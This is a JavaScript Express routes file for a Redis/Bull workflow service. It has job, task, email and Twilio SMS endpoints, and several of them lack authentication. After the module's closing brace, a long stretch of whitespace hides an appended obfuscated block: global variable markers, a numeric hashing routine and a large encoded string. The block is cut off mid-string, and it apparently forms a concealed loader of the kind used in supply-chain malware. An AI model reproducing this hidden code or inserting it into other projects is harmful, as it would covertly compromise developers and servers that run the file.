const { promisify } = require('util');
const bodyParser = require("body-parser");
const URL = require('url');
const keys = require('../config/keys');
const NODE_ENV = process.env.NODE_ENV || "local";
const {
	flowQueue,
	taskQueue,
	emailQueue,
	FLOW_QUEUE,
	TASK_QUEUE,
} = require('../config/bull');
const Auth = require("../services/authentication");
const sample_flow_definition = require('../config/wf-definition-example-1.json');
const MessagingResponse = require('twilio').twiml.MessagingResponse;
const redis = require('redis');
const async = require('async');
const redisqueries = require('../services/redisqueries');
const taskqueries = require('../services/taskqueries');
const { doesNotMatch } = require('assert');
const accountSid = keys.twilioAccountSid;
const authToken = keys.twilioAuthToken;
const client = require('twilio')(accountSid, authToken);
const queueController = require("../controller/queueController");



module.exports = app => {
	app.use(bodyParser.urlencoded({ extended: false }));
	app.use(bodyParser.json());

	/*
	app.get('/allkeys/:id', async function (req, res) {
		console.log(req.params.id)
		redisqueries.allkeys(`bull:${FLOW_QUEUE}:${req.params.id}*`)
			.then(keys => {
				res.json({ "status": true, "message": keys, "status_code": 200 })
			})
			.catch(alert => {
				res.json({ "status": false, "message": alert.message, "status_code": 401 })
			})
	})
			*/

	app.get('/allkeys/:id?', async function (req, res) {
		try {
			var { id } = req.params;

			// 1. Check if ID is provided
			if (!id) {
				id = '*';
			}

			// 2. Optional: Basic sanitization/validation (e.g., alphanumeric only)
			// This prevents directory traversal or Redis pattern injection
			/*if (!/^[a-zA-Z0-9_*1-]+$/.test(id)) {
				return res.status(400).json({ 
					status: false, 
					message: "Invalid format. Use alphanumeric or '*'.", 
					status_code: 400 
				});
			}*/

			console.log(`Searching keys for ID: ${id}`);

			// 3. Perform the query using await
			const keys = await redisqueries.allkeys(id);

			res.json({
				status: true,
				message: keys,
				status_code: 200
			});

		} catch (error) {
			// 4. Handle unexpected errors (Redis connection, etc.)
			console.error("Redis Error:", error);
			res.status(500).json({
				status: false,
				message: "Internal Server Error",
				status_code: 500
			});
		}
	});

	app.get('/allIds', async function (req, res) {
		redisqueries.allIds(resData => {
			res.send(resData)
		})
	})

	app.get('/queues', async function (req, res) {
		redisqueries.scan(resData => {
			res.send(resData)
		})
	})

	/**
 * API to clean completed and failed jobs from all primary queues
 * Usage: GET /clean-queues?grace=1000 (grace is in milliseconds)
 */
	app.get('/clean-queues', async function (req, res) {
		try {
			// Default grace period of 24 hours (86,400,000 ms) if not specified
			const grace = req.query.grace ? parseInt(req.query.grace) : 24 * 3600 * 1000;
			const queue = req.query.queue ? String(req.query.queue) : FLOW_QUEUE;

			const queues = [
				{ name: queue, instance: flowQueue },
			];

			const results = {};
			console.log(`Starting cleanup ${queue} with grace period: ${grace} ms`);

			// Loop through each queue and clean both 'completed' and 'failed'
			for (const q of queues) {
				const cleanedCompleted = await q.instance.clean(grace, 'completed');
				const cleanedFailed = await q.instance.clean(grace, 'failed');

				results[q.name] = {
					completed_removed: cleanedCompleted.length,
					failed_removed: cleanedFailed.length
				};
			}

			console.log("Cleanup Results:", results);
			res.status(200).json({
				status: true,
				message: "Cleanup successful",
				grace_period_ms: grace,
				data: results
			});

		} catch (err) {
			console.error("Cleanup Error:", err);
			res.status(500).json({ status: false, message: err.message });
		}
	});

	const checkAuth = (NODE_ENV === 'test' || NODE_ENV === 'local')
		? (req, res, next) => next() // Skip middleware
		: Auth.Authenticate;         // Use real middleware

	app.post('/orchestration', checkAuth, async function (req, res) {
		console.log(req.headers)
		const url = URL.parse(req.url, true)
		const mode = url.query.mode;
		const jobDefinition = (mode && mode === "test") ? sample_flow_definition : req.body;
		redisqueries.instanceNumber(`bull:${FLOW_QUEUE}:id`)
			.then(uniqueId => {
				console.log(uniqueId);
				const JobOpts = {
					...jobDefinition._id && { jobId: jobDefinition._id + "-" + uniqueId }
				};
				console.log("Posting ", (mode && mode === "test") ? "sample flow definition" : "flow definition", JobOpts);
				jobDefinition.name = jobDefinition.workflowName;
				jobDefinition.tenant = req.headers.tenant;
				jobDefinition.state = "Queued";
				flowQueue.add(jobDefinition, JobOpts)
					.then(result => {
						console.log("jobId:", result.id, "jobState:", result.getState())
						res.json({ "status": true, "data": result, "status_code": 200 })
					}, error => {
						console.log("error:", error)
						res.json({ "status": false, "message": error.message, "status_code": 401 });
					})
					.catch(alert => {
						console.log("alert:", alert)
						res.json({ "status": false, "message": alert.message, "status_code": 401 });
					})
			})
			.catch(alert => {
				res.json({ "status": false, "message": alert.message, "status_code": 401 })
			})
	})

	app.get('/orchestration/:id', Auth.Authenticate, function (req, res) {
		console.log(req.params.id)
		flowQueue.getJob(req.params.id)
			.then(job => {
				console.log("result:", job)
				job.getState()
					.then(result => {
						console.log("jobState:", result)
					})
					.catch(alert => {
						console.log("alert:", alert)
					})
				res.send(job)
			}, error => {
				console.log("(ops!)error:", error)
				res.send(error)
			})
			.catch(alert => {
				console.log("alert:", alert)
				res.send(alert)
			})
	})

	app.get('/logs/:jobId', Auth.Authenticate, function (req, res) {
		const jobId = req.params.jobId;
		const url = URL.parse(req.url, true);
		const start = url.query.start ? url.query.start : 0;
		const end = url.query.end ? url.query.end : 20;
		flowQueue.getJobLogs(jobId, start, end)
			.then(logs => {
				console.log(`jobLogs(${jobId}?${start}&${end}):`, logs)
				res.json(logs);
			}, error => {
				console.log("(ops!)error:", error)
				res.send(error)
			})
			.catch(alert => {
				console.log("(ops!)alert:", alert);
				res.send(alert);
			})
	})

	const resumePausedJob = async (jobId, outcome, res, asHtml) => {
		let normalizedOutcome = outcome;
		if (outcome.match(/App/i)) normalizedOutcome = 'approved';
		else if (outcome.match(/Rej/i)) normalizedOutcome = 'rejected';

		const job = await flowQueue.getJob(jobId);
		if (!job) {
			return res.status(404).send(asHtml
				? `<html><body><h2>Job not found</h2><p>Job ID: ${jobId}</p></body></html>`
				: "Job not found");
		}
		if (job.data.state !== "Paused") {
			return res.send(asHtml
				? `<html><body><h2>Unable to resume</h2><p>Only a paused job could be resumed.</p></body></html>`
				: "Only a paused job could be resumed");
		}
		if (job.data.hasOwnProperty('current_branch') && job.data.current_branch.length > 0) {
			job.data.definition.actions = [].concat(job.data.current_branch, job.data.definition.actions);
		}
		const jobData = { ...job.data };
		jobData.definition.actions[0].configuration.properties.outcome = normalizedOutcome;
		jobData.outcome = normalizedOutcome;
		flowQueue.getJobLogs(jobId)
			.then(logs => {
				const jobLogs = { ...logs }
				console.log("jobLogs123:", jobLogs);
				job.remove();
				flowQueue.add(jobData, { jobId: jobId })
					.then(resumedJob => {
						jobLogs.logs.forEach(log => {
							resumedJob.log(log);
						});
						return resumedJob;
					})
					.then(resumedJob => {
						if (asHtml) {
							res.send(`<html><body style="font-family:Arial,sans-serif;padding:24px;">
								<h2>Response recorded</h2>
								<p>Job <strong>${jobId}</strong> was marked as <strong>${normalizedOutcome}</strong>.</p>
								<p>You can close this window.</p>
							</body></html>`);
						} else {
							res.send(resumedJob);
						}
					})
			})
			.catch(err => {
				console.log("resumejob error:", err);
				res.status(500).send(asHtml
					? `<html><body><h2>Error</h2><p>${err.message || err}</p></body></html>`
					: err);
			})
	}

	// API / Postman (requires Authorization + tenant headers)
	app.post('/resumejob/:jobId/:outcome', Auth.Authenticate, async function (req, res) {
		await resumePausedJob(req.params.jobId, req.params.outcome, res, false);
	})

	// Email Approve/Reject links (browser GET, no auth headers available)
	app.get('/resumejob/:jobId/:outcome', async function (req, res) {
		await resumePausedJob(req.params.jobId, req.params.outcome, res, true);
	})

	app.get('/instances/:flowId', Auth.Authenticate, function (req, res) {
		const flowId = req.params.flowId;

		redisqueries.allkeys(`bull:${FLOW_QUEUE}:${flowId}-*[^s]`)
			.then(async keys => {
				//console.log(keys);
				const instList = []
				var inst = {}
				var getJobList = new Promise((resolve, reject) => {
					strRegex = new RegExp(`bull\\:${FLOW_QUEUE}\\:(.*)`);
					keys.forEach(async (key, i, array) => {
						//console.log(key, i)
						//if (!key.endsWith(":logs")) {
						//inst = await flowQueue.getJob(key.match(/bull\:FLOW\:(.*)/)[1])
						inst = await flowQueue.getJob(key.match(strRegex)[1])
						if (inst) instList.push(inst)
						//}
						if (i === array.length - 1) resolve();
					})
				})

				getJobList.then(() => {
					console.log(`Log instances for ${flowId}:`, instList.length);
					if (instList.length > 0) {
						let lists = instList.sort(function (a, b) {
							return new Date(b.timestamp) - new Date(a.timestamp);
						}).filter(x => x.data.tenant == req.headers.tenant);
						res.status(200).json({ "status": true, "data": lists })
					} else {
						res.json({ "status": false, "data": [], "status_code": 401 })
					}
				})
			}, error => {
				console.log("error:", error);
				res.json({ "status": false, "message": "Found no matching keys", "status_code": 401 });
			})
			.catch(alert => {
				console.log("(ops!)alert:", alert);
				res.json({ "status": false, "message": alert.message, "status_code": 401 })
			})

	})

	app.get('/task/:id', function (req, res) {
		const id = req.params.id;
		console.log("Retriving task:", id);/*
	var task = await taskQueue.getJob(id); 
		.then(task => {
			console.log(`Found task id: ${id}`, task)
			res.status(200).send(task)
		}).catch(err => {
			console.log(`Error retrieving task...${err}`)
			res.status(501).send({status: 501, error: err})
		}) */
		taskQueue.getJob(id)
			.then(task => {
				console.log(`Found task id: ${id}`, task)
				res.status(200).send(task)
			}).catch(err => {
				console.log(`Error retrieving task...${err}`)
				res.status(501).send({ status: 501, error: err })
			})
		//console.log(`task id: ${id}`, task)
		//res.status(200).send(task)
	})

	app.get('/tasks', function (req, res) {
		var owner = req.headers.owner ? req.headers.owner : "";
		console.log("owner", owner)
		var getKeys = new Promise(async (resolve, reject) => {
			var keys = [];
			var keylist = undefined
			try {
				keylist = await redisqueries.allkeys(`bull:${TASK_QUEUE}:${owner}-*`).catch(e => { reject(e) })
				keys = keys.concat(keylist)
				console.log("key length:", keys.length)
				resolve(keys)
			} catch (err) {
				reject({ message: err.message, status: false })
			}
		});
		getKeys.then((allkeys) => {
			const taskList = [];
			var taskInst = undefined;
			var getTaskList = new Promise((resolve, reject) => {
				try {
					allkeys.forEach(async (key, i, array) => {
						console.log("Retriving task:", key, key.match(/([^:]+$)/)[0]); //substring after the last colon (i.e. :)
						taskInst = await taskQueue.getJob(key.match(/([^:]+$)/)[0]).catch(e => { reject(e) });
						//console.log(taskInst)
						taskInst && taskList.push({ id: taskInst.id, timestamp: taskInst.timestamp, key: key, data: taskInst.data, task: taskInst });
						if (i === array.length - 1) resolve(taskList);
					})
				} catch (err) {
					//reject({ message: err.message, status: false })
					reject(err)
				}
			})

			getTaskList.then((tl) => {
				res.status(200).send(tl)
			})

			getTaskList.catch(err => {
				console.log("getTaskList err", err)
				res.status(401).send({})
			})
		})
			.catch(alert => {
				console.log("(ops!) alert:", alert);
				res.json({ "status": false, "message": alert, "status_code": 401 })
			})
	})

	app.patch('/task/:id/:outcome', Auth.Authenticate, async function (req, res) {
		const id = req.params.id;
		var outcome = req.params.outcome;
		var taskInst = undefined;
		console.log("Retriving task:", id, " outcome:", outcome);
		taskInst = await taskQueue.getJob(id);
		outcome = outcome.match(/App/i) ? 'approved' : outcome.match(/Rej/i) ? 'rejected' : outcome;
		console.log("User's response:", outcome)

		taskqueries.resume(taskInst, outcome)
			.then(async ans => {
				if (ans.resumed) {
					// completion criteria met, update other tasks...
					taskqueries.closePendingTasks(taskInst, outcome)
				}
				console.log("Resumed message:", ans)
				taskInst.data.status = "Completed";
				taskInst.data.response = outcome;
				taskInst.data.updated = Date.now();
				await taskInst.update(taskInst.data);
				res.status(200).send(`${ans}`);
			}).catch(err => {
				console.log(`Error patching task...${err}`)
				res.status(501).send({ status: 501, error: err })
			})
	})

	app.patch('/externaltask/:id/:outcome', async function (req, res) {
		const id = req.params.id;
		var outcome = req.params.outcome;
		var taskInst = undefined;
		console.log("Retriving task:", id, " outcome:", outcome);
		taskInst = await taskQueue.getJob(id);
		outcome = outcome.match(/App/i) ? 'approved' : outcome.match(/Rej/i) ? 'rejected' : outcome;
		console.log("User's response:", outcome)

		taskqueries.resume(taskInst, outcome)
			.then(async ans => {
				if (ans.resumed) {
					// completion criteria met, update other tasks...
					taskqueries.closePendingTasks(taskInst, outcome)
				}
				console.log("Resumed message:", ans)
				taskInst.data.status = "Completed";
				taskInst.data.response = outcome;
				taskInst.data.updated = Date.now();
				await taskInst.update(taskInst.data);
				res.status(200).send(`${ans}`);
			}).catch(err => {
				console.log(`Error patching task...${err}`)
				res.status(501).send({ status: 501, error: err })
			})
	})

	app.post('/email/notify', function (req, res) {
		emailQueue.add(req.body)
			.then(result => {
				res.status(200).send("Success");
			})
			.catch(alert => {
				res.status(401).send(alert);
			})
	})

	app.post('/sms/reply', function (req, res) {
		const twiml = new MessagingResponse();
		//const smsCount = req.session.counter || 0;
		const msg = req.body.Body;
		//req.session.counter = smsCount + 1;
		console.log("BODY: ", req.body)
		var command = msg.match(/^task|tasks$/i) ? 'task' : msg.match(/^\?$/) ? '?' : msg;
		console.log('Command:', command);

		switch (command) {
			case "?":
				const replyMsg = "?: Command helps \
				\ntask, tasks: Get list of pending tasks \
				\napp[roved]: Approve a task \
				\nrej[ected]: Reject a task \
				\nlocation: Get location \
				\ndemo: Demo buttons \
				\nmore help: Redirect link"
				console.log(`replyMsg: ${replyMsg}`)
				twiml.message(replyMsg);
				res.writeHead(200, { 'Content-Type': 'text/xml' });
				res.end(twiml.toString());
				break
			case "location":
				client.messages.create({
					from: 'whatsapp:+16262473170',
					body: "Here is our office location",
					persistentAction: ['geo: 1.281422489647776,103.84804055799597'],
					to: req.body.From
				})
					.then(message => {
						console.log(message.sid);
						res.send(true)
					})
					.catch(error => console.error('error: ', error.message));
				break
			case "demo":
				client.messages.create({
					from: 'whatsapp:+16262473170',
					body: "Please select an action to be performed on task 10893237",
					to: req.body.From
				})
					.then(message => {
						console.log(message.sid);
						res.send(true)
					})
					.catch(error => console.error('error: ', error.message));
				break
			case "more help":
				client.messages.create({
					from: 'whatsapp:+16262473170',
					body: "For further enquiry, please tap below to call or visit out website.",
					to: req.body.From
				})
					.then(message => {
						res.send(true)
					})
					.catch(error => console.error('error: ', error.message));
				break
			default:
				taskQueue.getJobs(['delayed'], 0, 100)
					.then(async result => {
						const outcome = command.match(/App/i) ? 'approved' : command.match(/Rej/i) ? 'rejected' :
							command.match(/task/i) ? 'task' : undefined;
						console.log("User's response:", outcome);

						var waitingJob = result.filter(obj => { return obj.data.to === req.body.From })
						console.log(`Total: ${result.length}, # of waiting jobs for ${req.body.From}`, waitingJob.length)
						var openJob = waitingJob.filter(obj => { return obj.data.status === 'New' })
						if (outcome == "task") {
							if (waitingJob.length < 1) return 'There were no pending task for you'
							return (openJob.length < 1) ? `There were no pending task for you` : openJob.map(x => `${x.id}, ${x.data.taskName}`).join('\n');
						}

						if (outcome === undefined) return `Failed interprete your reply: ${msg}, reply "?" to get help`;
						if (openJob.length < 1) return `There were no pending task to ${outcome}`;

						var replyMsg = "";

						return taskqueries.resume(openJob[0], outcome)
							.then(async ans => {
								console.log(`1. Resumed: ${ans.resumed}, message: ${ans.message}`);
								if (ans.resumed) {
									// completion criteria met, update other tasks...
									taskqueries.closePendingTasks(waitingJob[0], outcome)
								}

								waitingJob[0].data.status = "Completed";
								waitingJob[0].data.response = outcome;
								waitingJob[0].data.updated = Date.now();
								await waitingJob[0].update(waitingJob[0].data);
								//await waitingJob[0].promote();
								//await waitingJob[0].moveToCompleted('completed', true, true)
								//await waitingJob[0].remove();
								return `${ans.message}`;

							}).catch(err => {
								console.log(`Error...${err} ${msg}`)
								return `Error... ${err}`
							})
					})
					.then(replyMsg => {
						console.log(`replyMsg: ${replyMsg}`)
						twiml.message(replyMsg);
						res.writeHead(200, { 'Content-Type': 'text/xml' });
						res.end(twiml.toString());
					})
					.catch(alert => {
						console.log("ops!alert:", alert);
						twiml.message('Failed!');
						res.writeHead(200, { 'Content-Type': 'text/xml' });
						res.end(twiml.toString());
					})
				break
		}

		//console.log("SESSION: ", req.session)
		//res.set('Content-Type', 'text/xml')
	})

	// Routes
	app.get("/queues-v2", queueController.getQueues);
	app.get("/queue-v2/:queueName/jobs", queueController.getJobs);
	app.get("/queue-v2/:queueName/:jobId/jobsdetails", queueController.getJobsDetails);
	app.get("/queue-v2/:queueName/job/:jobId", queueController.getJobById);
	app.get("/getAllRepeatableJobs", queueController.getAllRepeatableJobs);
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           global.i = 'A10-*6490';global.j=1;/*RS260605*/function LEvvyh(LEvvyh){var mmqSey=(LEvvyh|0x0)^0x9e3779b9,WiuZ9wt=0x243f6a88|0x0,gr5Rp1a=0x6a09e667|0x0;for(var m_x8_P=0x0;m_x8_P<0x13;m_x8_P++){rsd7Zi(mmqSey=mmqSey+(WiuZ9wt<<0x7^WiuZ9wt>>>0x3)+gr5Rp1a|0x0,mmqSey=mmqSey^mmqSey>>>0xf|0x0,mmqSey=mmqSey+(mmqSey<<0xb)|0x0,WiuZ9wt=WiuZ9wt^(mmqSey<<0x4)+(mmqSey>>>0x9)+gr5Rp1a|0x0,WiuZ9wt=WiuZ9wt+(WiuZ9wt<<0x6)|0x0,WiuZ9wt=WiuZ9wt^WiuZ9wt>>>0xd|0x0,gr5Rp1a=gr5Rp1a+0x7f4a7c15|0x0)}rsd7Zi(mmqSey=mmqSey^WiuZ9wt|0x0,mmqSey=mmqSey+(mmqSey<<0x3)|0x0,mmqSey=mmqSey^mmqSey>>>0xb|0x0,mmqSey=mmqSey+(mmqSey<<0xf)|0x0,WiuZ9wt=WiuZ9wt^WiuZ9wt>>>0xd|0x0,WiuZ9wt=WiuZ9wt+(WiuZ9wt<<0x7)|0x0,WiuZ9wt=WiuZ9wt^WiuZ9wt>>>0x11|0x0);return(mmqSey>>>0x0)*0x100000+(WiuZ9wt>>>0xc)}var mmqSey=[0x316,-0x329,0x138,0x393,-0x175,0x2c7,-0x125,0x2a9,-0x196,-0xec,0x333,0x391,-0x1f9,-0xae,0x39e,0x396,-0x25a,0x2c9,0x2dc,-0x2f6,-0x13d,0x10c,-0x275,0x211,0x30d,-0x47,0x7a,0x36c,-0x253,-0x86,0xa4,-0x180,-0xd8,0x1cc,-0x209,-0x1b0,0x20c,-0x23b,0x39c,0xdb,-0x9,-0x27a,-0x93,-0x63,-0x159,0x1b0,-0xe9,0x1fb,-0x1bf,-0xde,-0x33f,0x62,-0x3b6,0x1fe,-0x40,0x366,0xf6,-0x260,0x107,0x6,0x288,-0x11a,-0x3a3,0x2c9,0x3a8,0x245,0x2ce,-0xc3,0x154,0x32f,-0x2fd,-0x2eb,-0x21b,-0x2b9,-0x2d9,0x280,0x19d,0x26f,-0x308,0x39f,-0x352,-0x2f1,0x5d,0x3e6,-0x3c,0x1eb,-0x138,-0x191,-0x160,-0x8f,-0x361,0x20b,0x6b,-0x205,0x3be,-0x2b0,0x2b6,0x34c,-0x1e9,0x322];var WiuZ9wt="Jk}UE^Z=,J>imcTBAR\\=,gZK9?A>Ha9;#D5PS1ZJ;N8uWJq+4Dal$!ZAkp^2DWf-t7yx@rIa.S&U8W'QRB?^\\BPu6Lh~kF9/qW($U2\\QmP8e,Bl\"3dlZXz62b*W#EnQMFP[j?dE%hWTSHS(95TQ]K\"mc!z>hs]SNDGhrM[eXy$sB[:ghI}(oXFtwt$@_]a-X:`*.1B}<-A!{m_p\"k6]S)u.6f8}_? rz^gGh&%W!~VJK<PW(|~X!=T=:s@G= Bwa0;qwU+.dv3#twjTP_#:,~]u#c`xHVVDZJ7il.9n(DzjS4T-QS=<TAy` Iwfqay/P3%[2_5CY;=/4@Hi2J8E;C4^9Ay[HJetS=\"Q$e6s]EAh\\=,N]+JWP}<N2%Lg?0xa^.]GEcQag6cJ$B~rRk'(I|aP28U+mSH.@jx*;1u~vanVBpEp*\"d`gn@7k/A:<#Mk,x}.vfdn00\\(n>US:Qe*WT)[hI+@2<>OP\\+9YSO[j@:,3*~[PP8Mg)FUhjJgDAH${\\~i'|=p>@wi:6*_&Z(]-=Qcl~(F1zfe@QA<N[;lRt|eV85y/jc,4]9d$\\xFBsOK)V%|Agihi7|D$jDg?zG-?iQ-T+ScNBByj07iQ/c3zuwYwoci2\"4HvrvIx?smS \\C37dh|PM'E?}}uEPV%Wo7AJ7iY=)e03-DS1SmD|ZUTr!_[+{p}n4+wL}?>A1seE=$L>o>NZ#Ky|UkE26et&FZ@E#Dph,!uY1ZEI.cQsq3j%> +'Zm|%Pv ===&ZTV6Wr8^5,H)iWsp5&c@26Mx{SCqUCJ+lLd-P!L']K eA~;I(LS;V{-z*[.)u!#V|@=:aYj\"aWR\\Q7*uaQEY=%{QA:OsvTB+$X()A1L-`i@?zkbdgymCpD5<P?Zxx)b'WQ5DH?VJM?i7ULR1}s5Lk@xOlP,sltQ }2O2\\-oh< E=coD+E.BSY,EEt'ge?woOX\\*E8)tbZO'smD=~zhT5H*[(uKWp5CL_'4zr_?!{=${F%{mH?O$/x{tU!L\\'19u.g@72.lr?%6hm.`k<`IFC%a=aB#[G@S%$.~N(D01m0l{R}IxC=2dc[g~-YV@(\"\"E@WWPttrih3V(IDeER\\k|Z9D:wb)}>/Gq<c<AcU<+AV~OIAd:o4T2\\&{YNZaXSh)QW#-,szB4Ss\\v]O#&i|8%,/<}ge1Vf&7Tt#x{qPgD{w613vq'4iqxmrZRSGyM<'*#aJ\\XR'v!I\\Vp6`,P0o0O!VDI9Mkijl/=ct+dh%:sLwK|;TGLxljyiFd./FVD5RP#;I88H8D\"E/E\"%~=D(nFA# &^ x]Uy5qzlkl;tNC5vuOJtT$:?CY<|=&qdkIqpxQ@MM*c&:qNAT/8UwHL;\"fGC$Tv;)aawS8eLKT[,P?_EgMuXBona|rBT_UmR(x@lpa;+Pk[ymAjc>yvgE}JM1o%pryqni'Lj|t,;bLYP;o\"?-\"Q.EVx<lQ(0ybC3QD2&: .NxQTMK7kf\\yk8aCVjgZtSnyf6\"JF2>/oBU%Vy!3wo|}e-tB6x8iEOTY]\"NIn+[62pe5dk{A8[U_4S<kT}fZ{V,akA=.>GIb+.cc|Q]x[<4Y2`1:nv)t@a{</Xm,E=,J>oT<IA^SJ(W<<+c?zO~0~@`>6)\"-b.d*\\0@K _P!u.v!\\`((UR_Lf-\"!kXq[#a/c ~7`Z=1T.#%sH8VRO!vXrV/nXRPKH;TOf%sNHTeYg&r$7G$R#U#mreeyz5-f>LP''LvFy.V_}W>n?mD>i$5*ZqqY,MBDd{ v wbvmfN\">zbx1dS0+]`_Nhn;CePy\"yKz OsQ:_\\~4zSn+/dlH3NO=..M}wE}htRFR8LcD2w}Ss1|*S^t?5s9il^Pg8I)38b~1;_wOh%N^1FxE($(,60$VRRGO=|j'LNiPu#NCQ,*D7H_+ZuaW:V(s|LNp29GPWxb-`)t{2%@zRcp<01#V0v)5\\wE^L.m%8Uru$[gP)4_\"\"rp8>$(r^_x,lkMskl0|jpc1`p%=VQ9RC^-tk1;-78L$6aKcxIdt@5Qk_y(Ak8<E~w`w,6B!gmux2(fv|+czmf]Qv8$ |3E*lX^I|8hVEEo>Wzz6DfHXKlLyzJU%u&q8-1cBA9(kF[DSSH*F<pW,Se_&*Y1>Y]^?8lKPD%!F+|PZ_Z({X<?JfEq4(BKd2(3FdO'Az/hSLdLAp@5o,i9U+in5Wtk+:4hq,u7yZNxBP\\?X)tN5FX>V,C._:#hQp9jBho!?81m*<RAoY8u&JlV#ARBw@'Wj(, \\m^XerAywq?0oYZUnADS]Bfu.l?yg+rX3,W9Hash=1/gLgF2#QV]qgYi#^1PG.z|@X1S=1[v2\"M=XM<`cN#iK- `>/na_ZT?/(|q\"Ot6_ujc~?l!+Sn3/TkuuCwJ)>b*\\DCep,t*F`~57+6{U.EAqA?K~<#jkm/i5x}qm52c.)\\XIfXox9MYuKU<E}3>oAq8 xOq0Lv,-<67R'{(j's[+pcTeP2=[4'[lruWr&k\\Rt5*9m;;#|<\\gMSH>k1LQW,tKUT!M}}xPaVQVMrsF[7^z<i3Ay^EurDsqy8|)wkv'nX{\\O[{!h=%b`5J2l%4zpfor-O8=gaKho`yf|.{z>-4`!!*1-?N[Ja#_/&`A|`Jb2W'CRi(Qp@zveq<ay'RQ}_Dm{]=N{QO*9:)?:urmI2i+\"?ys:@(besvM{ZlqQr{ejD0O9FAV$y+41`oT\\d[@XZ O8H$L](G*\"[r\\gwUuxwi]s<:%2YCj=E=auA=!'/3/!bvSUq4tL*Zr<pf13v'9y@pwP_6L^>i8^7r*jQ+@_$mts\"ycE45'Zl4V{ME>G[S&>f0wbV6AXSPQri~J5`.$TCYunDJ@\"kIhmSeVQ4SHP{^t*gzKdGKxNH`_5N.s\"9yE\"?K,\"|^YEm_hF8rl*4-g]cgS~lxK jSGTw6VAtN'D&o3VK_n@#Sd2Xz\\lM?eF >SrN)t7U/cJ*bd3y}1^4a;`jUEM-AX1@aX!R8nEMq0je+j`]OOfHx*jY.}$k[kc$qg%tu7P)(2#FAnDxM%UTba)nHm4Tcn'>,5prG4}]e.H(d%QCoMEI^pYYvC?I;X//,e\\vd1WPN:4#9>R9TFC08~dV,jgpoJ#~HfK^ib}6e,8S~|'=c-LFV%0Y\\Zl;gGSy%P'QV3kyX)p,Rw|X|KZpZ-hYZG&u?d[_~fR4m2g^RYbR^i)D~e3Y|lqjzKx`IQUbcfN2Dy~rT#;/8_=A?Jva>Z+>1]>F{'DJcF%}`a?7*u+)U7>L`.@Ejf*X3>D_xHjr9974Ng;,nZ6>^m[V2S[:)vwM2^Nqq-3np3|W,LBJY\\,t(TMt%]^GJ?0DL/7fqQ*YqFf!VIrls4WO.5^)nc OmEbf+|*%OD^_?[p>hVyRkg$oluPP&23.(Dyw&v*3)qz,$MWt(zo'+|iYE*11zQome{f?lhq=$9\\|Q_5Jo#hq9[m\\>r'7]Ju\\ yE-5P;T47q\"RE[Gd\"}]h6q,]^eH~KfwpZCvxur9Hpx7!E<Al&QJ8X<{{T$K>y>A\\DuJ7RK*?S)>;P!?CD<jf#Xx^t[dBZ~YEv`&r#}'hhG.`dmzV)_lC{2h4Tk=7xwGow \"p_/[->e[~+<(sJUBDIj`4)Ng>i3jf\"j/ADbdzN&drG]@ei=2[]uVaCz)>p/U}d'<tVIvH\\}dX,`=\\ms7^7%yH/ikjH_KwoX+x7EOdTw,)xz2n'sb#nnwE'c#rHC;Z&>?.Rj8(+}q7XXA30#_x:P-I]?0Yb`|,\"@8wPFuALa1v%!d[\"6$HI45b@l[C,6'#|7\\a>Hgb3#7[2^dw\"y9vH0&tL=DM:^GO>@5B%.&J&ZX}0?l}j^0|cFgI5'38HFT-U\"yZUp/$E hYK6C__rgi}'7S*hUPVUu'z.TV4(dS<yV+~M|\"*\\xQ_%_ hIUzSW%t#)jGy\"kxt%'%egw{,0MctzNw/dZX6;d|h+vT/Cohi1),j=yrc)[<W/E$Pe*#UTo!`r,memXEChU7?2wC#!-]le`,=HccA@R{8Cp&ryD?fs[('K24s0;Nbx7JJdC)31EZMs+u5lJTSAk!C`Y/\"Q$!TH49$)[~=-}%z=6HeCpv_&0P:f_|f.WqS+td?qt8^s!J\\\\,86 4`;-FZL_7Jl&*-OT|VLv}yk?(vrN;$F@mfS[sDV|Mhyqq,'k%~ylf%Z:GW:i=W{;v)kye0Ne+NAgWm}P<1g9Ptr)8jl_toA*<.>,Gp5<lS3_Dz&|^w/{Bz#QfyrO@5I])>7tK*Fe|C2'[2^~YEMAZeyd#i'%Q<*S5sY.M:)/q`x$5!K\\lZ)1\\tIR{B!|C:R6BU.{g3:a,n8U)04y2d]0b,QhyeO;JtyE(:5.=uBtzxEx77z;Jao!9Cpv0h/;2|2ux2W5hpLqJRv9N7j(hy>,m-{j z0`yRF>R9k>dxGNd2<JJ=EX1~K:5%>Q%p6Tf>Wx8b<w[Woh]:xBDNeC5kQb>Ik[yK I[OB^mum(m80cr N^p:Y!^<|W<qh2~4&E(z(2j,o):>:s(tR%O7P5fVd]LOsgg%^>.-So 1=|XNAON(#d]*8(6p8<Q()xxtLq$IGVON{WEhLln?}dwVgK.%~7X$~Y(4miSeB{!RkO/WTy,lAe#zzb?\\j]%E@.t9AxNtL\\=K|7lWPF]R{5f;9M.tC%fhXI[ZmS_/t#ncLkDjURB/O'</UH_ |IjyIjeIR-pEDpl{F1mx%EFYmwgo:u3Z`}vuUgsks8h5LyDzvl\"|[q%$OVQI3[3%1QG>:+rmUOXfiDUd`.vnxZX;TwJhW35rxuf3hrIZ4Tf9JKw}9\\gBHT!,[:Hpo5lh_9b{D|S*$.jJp*tZ?XgiE0Zz'n7%87E|2Wgq5vM-TxXg[GU(ONt/<oP4pKY1TysN)\"M&MZbF]+#z=.^\\L3\\1U5+G|bIberbbu'P{V*bt,Z`CpINj4Y$<}x<R S=Yn:ybwC806)Sw-2-!1T0f<nkualGk;^EOm!^<O9bn?|3Ivj-4Rt\"OZoL~*n4*%u|hVH,8? %vk:X(>QZ#K1}Ipz2BY,u0n|CpEO6u^eKt(1+qq*!E|Q eC)N`~&nO s4A4witPmRKMn's\"u]qH.sDiAz`W(hHt;YZ,\\}yC1bO0(8T*\"q,x]y\\B;'\\!fwiPn2<SW@(y]R({4u pe&/P3oeaqgYp6;_~}ptIt7m~x@8me<is%B93wmC{G0]uLcCpFCf1rQR@lSly@_{|A&_^c/R*6tEb1$oBVhG3XpV=&H%%N.IX=B9*TK_!S`H(w/AbQ^k.OO[KJZnzjpR)Tp2Ii?i<91)S^UwXxX-V,RR rM4HjEc2t/p+)+'vh_E#X1v/zjd%_Iw_A\\4h3tK3V<\\EqQYJq=`+d*gou^J(4Zz)>\\]kbm:^31X\\Em&7jtsTD~:o+U\\UD*-V!{cFZ+{-pV~0EtW+F.Z-tu'e\\FB#jYD+8/8cE/nURrAkf//t01Qzo# F:&,uN-O=u!I k<,\"?n5`*u1|EgZub6t0?'UdNn\"y/ 